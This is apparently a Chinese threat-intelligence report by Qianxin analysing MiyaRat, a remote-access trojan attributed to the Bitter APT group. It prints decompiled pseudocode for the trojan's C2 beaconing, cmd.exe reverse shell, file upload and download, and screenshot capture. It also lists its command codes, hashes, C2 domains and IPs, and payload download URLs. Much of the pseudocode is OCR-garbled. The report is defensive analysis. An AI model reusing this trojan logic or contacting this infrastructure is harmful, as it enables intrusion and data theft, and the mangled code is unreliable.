# 蔓灵花组织启用全新特马MiyaRat，国内用户成为首要目标  

原创威胁情报中心奇安信威胁情报中心2024年10月12日15:08北京  

## 概述  

奇安信威胁情报中心一直在持续跟踪南亚方向的众多APT攻击集合，发表了多篇系统性的技术报告：Operation Magichm[1]、Operation Angi[2]、operation Tejas[3]等，从 2019 年至今这些组织的手法几乎没有太大的变化，攻击技术上限较低，但通过广撒网的钓鱼模式仍能对政企客户造成一定程度的影响。  

如何免杀是Bitter组织（APT-Q-37）一直以来为之奋斗的首要目标，抛开初始攻击载荷chm、Ink 等过时技术不谈，仅后续下发的wmrat 和.net 特马都很难绕过特征查杀功能，攻击者在今年一直在尝试各种方法：6月份通过powershell加载havoc框架、7月份直接下发2018年就在使用的窃密插件，效果都不太理想，最终在9月份下发了全新的特马 MiyaRat 并被我们成功捕获。  

我们建议政企客户在办公区和服务器区同时部署天擎EDR，在开启云查功能下可以实现对chm、Ink等通用威胁的发现和拦截。  

  

### ·MiyaRat指令分析  

Bitter 使用的新型木马基本信息如下，PDB 显示该木马被攻击者命名为“Miya"，当前版本为1.1。  

<html><body><table><tr><td>MD5</td><td>6edc889abbc186fbd5e187818d916dee</td></tr><tr><td>文件名</td><td>mspnx.exe</td></tr><tr><td>文件大小</td><td>410.00 KB 3（419840字节）</td></tr><tr><td>PDB路径</td><td>C:\DRIVE_Y\EDRIVE\repos\Miyav1.1_client_msi\Release\Miya1. 1client.pdb</td></tr></table></body></html>  

该木马由MSI文件释放，MSI文件信息如下：  

<html><body><table><tr><td>MD5</td><td>5ff5e38943a134847e762f480dc84e09</td></tr><tr><td>文件名</td><td>mspnx.msi</td></tr><tr><td>文件大小</td><td>466.00 KB (477184字节）</td></tr><tr><td>下载链接</td><td>hxxp://locklearhealthapp.com/mspnx.msi</td></tr></table></body></html>  

木马首先解密出C2域名"samsnewlooker.com"。  

  

解密方式为按字节减去 key，用于解密的 key 被设为"doobiedoodoozie"。  

  

木马的主体功能在函数 sub_406960 中，调用 WSAConnectByNameW 连接 C2 服务器的 56172端口。  

  

收集一系列信息发送给C2 服务器，包括：磁盘信息、机器名、用户名、木马文件路径、%userprofile%环境变量、系统版本。  

memset(v278,0,sizeof(v278));   
pcbBuffer $=$ 16;   
GetUserNameW(Buffer,&pcbBuffer);   
pcbBuffer $=$ 16;   
GetComputerNameW(v282,&pcbBuffer);   
ModuleHandlew $=$ GetModuleHandleW(0);   
if（ModuleHandleW) GetModuleFileNameW(ModuleHandleW,Filename,Ox104u);   
pcbBuffer $=$ GetEnvironmentVariableW(L"USERPROFILE",V279,Ox104u);   
MwGetDriverInfo(Src);   
$\downarrow284=\textcircled{\circ}$   
memset（v250,0,0xB0u）;   
sub_409F20(v250,v180);   
LOBYTE $\yen123456$   
V6 $=$ GetModuleHandleW(L"ntdll.dll");   
if（!v6） goto LABEL_15;   
RtlGetVersion $=$ GetProcAddress(v6,"RtlGetVersion");   
if（!RtlGetVersion） $\yen15=$ v16=&v250[4]; goto LABEL_14;   
1   
memset（&v244[1],0,0x110u);   
v244[0] $=$ 276;   
if（!（（int（-_cdecl\*)（int $^{*}$ ))RtlGetVersion)(v244)) v177 =V244[2]; v8 $=$ Fn_40A260（（char\*）&v250[4],v244[1]）; v9 $=$ （char\*)Fn_412340（(int)v8,（const unsigned__int16\*)"."); v10 $=$ Fn_40A260(v9,v177); Fn_412340（（int)v10,（const unsigned-_int16\*)""): GetProductInfo（v244[1],v244[2],0,0,&pdwReturnedProductType); v178=v244[3];  

  

发送完收集的信息后，木马进入等待接收C2服务器下发指令的循环过程。木马支持的功能包括：文件信息枚举、命令执行、文件上传和下载、截屏等。下面对该木马涉及的指令依次进行介绍。  

木马指令整理如下：  


<html><body><table><tr><td>指令代码</td><td>功能</td></tr><tr><td>GDIR</td><td>列举指定目录下的文件和子目录信息，不遍历子目录</td></tr><tr><td>DELz</td><td>删除指定文件</td></tr><tr><td>GFS</td><td>递归枚举指定目录的所有文件信息</td></tr></table></body></html>  

蔓灵花组织启用全新特马MiyaRat，国内用户成为首要目标  


<html><body><table><tr><td>SH1cmd</td><td>创建命令执行的shell</td></tr><tr><td>SH1,SH2</td><td>将命令传入shell</td></tr><tr><td>SFS</td><td>连接C2服务器指定端口进行文件传输操作，二级指令UPL1上 传文件，DWNL下载文件</td></tr><tr><td>GSS</td><td>截屏</td></tr><tr><td>SH1exitclient</td><td>退出木马进程</td></tr></table></body></html>  

#### (1）GDIR  

列举指定目录下的文件和子目录信息，类似 Windows 的 dir 命令或 Linux 的Is 命令。列举信息包括文件和子目录名称、最近修改时间以及文件大小。目录枚举信息以‘ $\prime[\mathsf{E N D}]\sim\mathsf{I@\"{\$ 结尾。  

  

#### (2）DELz  

删除指定文件。  

if( $y z72=7$ 一$\downarrow T1=$ (LPCV0ID \*)v270[0];  
_wremove（（const wchar_t \*)v71); //删除文件  

#### (3) GFS  

递归枚举指定目录的所有文件信息，包括每个文件的路径和大小。在发送给C2 服务器信息的首行包含所有文件的总大小，输出信息用 $"\ @\ @\mathsf{G F S"}$ 标识。  

send(g_socket,（const char \*)v99,v274[0],0);   
sub_404E20(v270,::WideCharStr);   
LOBYTE $\sqrt{284})=52.$   
$\mathrm{vig}\in\mathbb{V}\bar{\mathbb{Z}}\bar{\mathbb{C}}$   
if（ $\because\sum72>0\times5$ 1   
v100 $=$ (LPCV0ID \*)v270[0];   
send（g_socket,(const char \*)v1o0,nNumberofBytesToWrite,①); Sleep(0x64u):   
send(g_socket,“=@@GFS",6,0）;   
sleep(0x1Eu);   
V101 $=$ ::WideCharStr;  

  

#### (4) SH1cmd  

创建一个 cmd.exe 进程作为 shell，执行管道传入的cmd 指令，并将执行结果返回给 C2 服务器。  

35 PipeAttributes.nLength $=12$   
36 PipeAttributes.bInheritHandle $=1$   
37 PipeAttributes.lpSecurityDescriptor $=\textcircled{[-\}$   
38 CreatePipe(hReadPipe,&hWritePipe,&PipeAttributes,0);   
39 CreatePipe(&v22,&g_cmd_pipe_input,&PipeAttributes,0);   
40 StartupInfo.hStdInput $=\times22$   
41 memset(&StartupInfo.lpReserved,0,40);   
42 \*（_QwoRD \*)&StartupInfo.wShowWindow $=$ 0i64;   
43 StartupInfo.cb $\gamma=~68$   
44 StartupInfo.dwFlags $=257$   
45 StartupInfo.hStdoutput $=$ hwritePipe;   
46 StartupInfo.hStdError $=$ hwritePipe;   
47 if（a21=1）   
48 goto LABEL_15;   
49 $\mathrm{~v~i~f~}=\mathrm{~\textcircled~{=~}~}$   
50 \*(_OWORD $\sqrt{2}\times15=0.0754$   
51 $\vee17=\emptyset$ 1   
52 FnWideStrAssign(v15,&unk_45ACE4,7);   
53 LOBYTE(v30)=1;   
54 $\begin{array}{r l}{{}^{+}2}&{{}=}\end{array}$ MwDecryptStr(lpMem,v15); // decrypt result:"cmd.exe"   
88 if (!CreateProcessw(0,v5,0,0,1,0,0,0,&StartupInfo,&ProcessInformation))   
89 return closesocket(s);   
90 LABEL_15:   
91 nNumberofBytesTowrite $=\odot$   
92 $\vee26~=~\Theta$ ，   
93 \*(_OWORD \*)lpBuffer $=$ 0i64;   
94 FnStrAssign(lpBuffer,&word_45ACF4,2u);   
95 v8 $=$ LpBuffer;   
96 if（v26 >θxF )   
97 v8 $=$ (LPCVoID\*)lpBuffer[0];   
98 WriteFile(g_cmd_pipe_input, v8,nNumberofBytesToWrite,0,0);   
99 Sleep(0xc8u);   
100 if (s!=-1’)   
101   
102 while(1)   
103   
104 while（1)   
105   
106 memset(Buffer, 0,sizeof(Buffer));   
107 if ( PeekNamedPipe(hReadPipe[0], 0, 0, 0, &TotalBytesAvail, 0) )   
108 break;   
109 LABEL_27:   
110 GetLastError();   
111 LABEL_28:   
112 Sleep(0x1Eu);   
113   
114 while（1)   
115   
116 if(!TotalBytesAvail   
117 goto LABEL_28;   
118 v9=0x2000;   
119 if（ TotalBytesAvail $<$ θx2000)   
120 v9 $=$ TotalBytesAvail;   
121 if (!ReadFile(hReadPipe[0], Buffer,v9,(LPDWoRD)&hReadPipe[1],0))   
122 goto LABEL_28;   
123 if (v9 $==$ 0x2000）   
124 Buffer[0x1FFF] $=\Theta$ ；   
125 v10 $=$ send(s,Buffer，v9,θ); $1/\l$ 发送cmd输出结果  

SH1和 SH2 两个指令功能几乎一致，将参数携带的cmd 指令写入命令管道，用于shell 执行。  

FnStrAssign(lpBuffer,（char \*)v121 $^+$ 3，nNumberOfBytesToWrite-3）;//提取指令参数 v1 $=$ V1090x60000;   
V122 $=$ lpBuffer;   
if（v274[1]>0xFu）   
V122=（LPCVOID \*)loBuffer[0]:   
WriteFile(q cmd pipe input.v122.q res -3.&v250f441.0）:   
if（v274[1] $>$ 0xFu)  

#### (6) SFS  

SFS 指令用于上传和下载文件，但该指令并不直接执行文件传输操作。该指令的参数为端口号，在 sub_404640（MwFileOp）函数中调用WSAConnectByNameW 连接同一C2 服务器的另一个指定端口，木马与该端口进行文件传输。  

$\vee268=\vee139$ \*v139 $=$ (int)v138; //arg2，用于文件传输的端口号字符串 V139[1] $=$ (int)v140; //arg1，c2域名 V139[2] $=$ (int)MwFileOp; L0BYTE(v284)=61; $\forall141=$ FnCreateThreadWrap(0,0,(LPCWSTR)sub_416930,v139,0,（int)&v259[1]);   
SetThreadExecutionState(ox8ooooooo);   
result $=$ WSAStartup( $\mathrm{0}\times2\mathrm{0}\geq\mathrm{0}$ ,&WSAData);   
if（!result) Sleep(0xFA0u); $\begin{array}{r l}{\mathbb{V}_{=}^{\top}}&{{}=}\end{array}$ WSASocketW(2,1,6,0，0，0）; g_socket_file_op=v3; if（v3==-1) return WSACleanup(); 7 else g_res $=$ WSAConnectByNameW（v3,nodename,servicename,0,0,0,0,0,0); if（ g_res ==-1 ） return closesocket(g_socket_file_op); else f $\downarrow4=$ recv(g_socket_file_op,buf,θx20o0,0); g_res =v4; while（v4>θ） //whileLoop，如果接收到文件传输指令 v66=0; v67=0; \*（_OWORD\*）v65=θi64; FnStrAssign(v65,buf,v4);  

MwFileOp 函数有两个二级指令"UPL1"和"DWNL"，分别完成文件上传和下载操作。  

<html><body><table><tr><td>文件传输指令</td><td>格式</td></tr><tr><td>UPL1</td><td>UPL1<上传文件路径></td></tr><tr><td>DWNL</td><td>DWNL<下载文件保存路径>,filesize==<接收文件大小></td></tr></table></body></html>

D0003AE3 MwFile0p:94 (4046E3) (Synchronized with IDA View-A, Hex View-1)  

在文件下载过程中，C2服务器如果发送“CANCEL2"，木马可以提前结束文件下载，不用等待接收完指定数量的文件数据。  

FnStrAssign(&Buf,buf,strlen(buf));  
$\yen123$ sub_40D000（&Buf,（int)"CANCEL2".v10);V18 $=$ V11；  
if(v17 $\Bumpeq$ xF）  

#### (7） GSS  

获取截屏，该指令的参数可以选择截屏保存图片的分辨率。输出信息用＂～!@SSS”和 $"\sim!\ @{\mathsf{S S}}$ E"标识截屏数据的开始和结束位置。  

CompatibleBitmap $=$ CreateConpatibleBitmap(DC,v3,v4);   
$\upharpoonright$ Selectobject(hdc,CompatibleBitmap);   
BitBlt（hdc,0,0，v3, $\cup4$ ，DC,0,0，0xCco02θu）;   
$\psi_{0}~=~\sinh^{2}~\stackrel{..}{\cdot}{}~\vee4$ wDest $=$ a2\*v3/5；   
hbma $=$ CreateCompatibleBitmap(Dc,wDest,v6/ 5);   
hdcDest $=$ CreateConpatibleDC(DC);   
$\vee\hat{\varepsilon}\left(\hat{\mathrm{\boldmath~\bar{~}}}\right)= $ Selectobject(hdcDest,hbma);   
StretchBlt（hdcDest,0,0,wDest,v6/ 5,hdc,0,0,wSrc,hSrc,@xCC0020u);   
bmi.bmiHeader.biSize $=$ 40;   
bni.bniHeader.biWidth $=$ wDest;   
\*(_DWoRD \*)&bmi.bmiHeader.biPlanes $=$ 1572865;   
memset(&bmi.bmiHeader.bicompression,0,24);   
bmi.bmiHeader.biHeight $=$ v6/ -5;   
wDesta=4v6/-5（（24wDest $^{+}$ 31)/-32);   
$\begin{array}{r l}{\Psi\overline{{\widetilde{I}}}}&{{}=}\end{array}$ （void \*)operator new[](wDesta）;   
GetDIBits(hdcDest,hbma,0,v6/5,v7。&bmi,0);   
send(s, "-!@sss", 6.0);   
Sleep(0x64u);   
send(s,（const char \*）&bmi，40,θ）;   
Sleep(0xC8u);   
send（s,（const char \*)v7,wDesta，0）;   
Sleep(0x64u);   
send(s,"\~1@ssE"，6,0);   
Sleep(0x14u);   
Selectobiect(hdc.h):  

(8） SH1exit client退出木马进程。  

## 总结  

目前，基于奇安信威胁情报中心的威胁情报数据的全线产品，包括奇安信威胁情报平台（TIP）、天擎、天眼高级威胁检测系统、奇安信NGSOC、奇安信态势感知等，都已经支持对此类攻击的精确检测。  

  
蔓灵花组织启用全新特马MiyaRat，国内用户成为首要目标  

#  

#### MD5:  

6edc889abbc186fbd5e187818d916deeb45c97ae0af336048529b8a3ef1749a50b8a556b9ce94a0559f153bf62ba2693d9159838e82ea73effc18ef5b958dacd26ed92fef383dfea8c40e4fd38668379  

#### CC:  

23.26.55.9:443(havoc) samsnewlooker.com 96.9.215.155:56172 wmiapcservice.com 185.106.123.198:40269 locklearhealthapp.com  

URL:  

https://maxnursesolutions.com/cssvr.jpg https://nurekleindesign.com/toronto.bin https://viyoappmapper.com/flv.ol https://locklearhealthapp.com/mspnx.msi https://locklearhealthapp.com/mayred.msi  

## 参考链接  

2024/10/12 15:17  

[1].https://ti.qianxin.com/blog/articles/%22operation-magichm%22:CHM-file-releaseand-subsequent-operation-of-BITTER-organization/  

[2].https://www.secrss.com/articles/31785  

[3].https://ti.qianxin.com/blog/articles/operation-tejas-a-dead-elephant-curled-up-inthe-kunlun-mountains/  

点击阅读原文至ALPHA7.0 即刻助力威胁研判  